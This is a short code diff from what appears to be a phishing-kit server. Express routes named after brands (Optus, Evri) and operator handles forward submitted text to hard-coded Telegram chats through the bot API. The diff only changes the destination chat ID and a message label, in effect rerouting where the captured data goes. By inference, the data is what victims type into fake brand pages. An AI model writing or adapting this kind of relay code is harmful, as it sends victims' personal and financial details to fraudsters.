@@ -7317,7 +7317,7 @@ app.post("/offshorebillionsOptus", (req, res) => {
           });
         axios
           .post(
-            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=5539333576&text=Optus:\n${originalText}`
+            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1248091713&text=Optus:\n${originalText}`
           )
           .catch((err) => {
             console.log(err);
@@ -7482,7 +7482,7 @@ app.post("/eggmanEvri", (req, res) => {
           `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
           {
             chat_id: 680379375,
-            text: `EvriEggman:\n${originalText}`,
+            text: `EvriTriz:\n${originalText}`,
             parse_mode: "Markdown",
           }
         )
